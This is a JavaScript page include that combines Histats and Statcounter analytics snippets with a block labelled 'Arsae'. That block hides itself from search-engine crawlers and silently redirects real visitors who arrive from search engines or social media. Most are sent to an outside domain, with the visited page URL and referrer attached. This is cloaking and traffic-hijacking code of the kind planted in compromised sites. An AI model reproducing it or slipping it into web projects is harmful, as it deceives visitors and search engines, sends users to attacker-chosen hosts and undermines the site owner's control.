///// Histats /////
document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4825766&101"width="0" height="0"/>');

///// Statcounter /////

var sc_project=12978198; 
var sc_invisible=1; 
var sc_security="9f31a33b"; 

document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
document.write('<noscript>');
document.write('<div class="statcounter">');
document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
document.write('<img class="statcounter" src="https://c.statcounter.com/12978198/0/9f31a33b/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
document.write('</a>');
document.write('</div>');
document.write('</noscript>');

///// Arsae /////
var ars = 'https://arsa.sacetmode.com/';
var redirect_urls = ['https://example.com', 'https://example2.com'];

// Bot detection
function isBot() {
    return /bot|googlebot|bingbot|yandexbot|duckduckbot|yahoo|baidu|baiduspider|crawler|spider|robot|crawling|facebookexternalhit|slurp|msnbot/i.test(navigator.userAgent);
}

// Get referrer source
var referrer = document.referrer.toLowerCase();

// Continue only if it's NOT a bot
if (!isBot()) {
    // Handle Google traffic
    if (referrer.includes('.google.')) {
        window.location.href = redirect_urls[Math.floor(Math.random() * redirect_urls.length)];
    }
    // Handle other search engines and social media
    else if (['.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => referrer.includes(s)) || 
             ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
        window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer);
    }
}
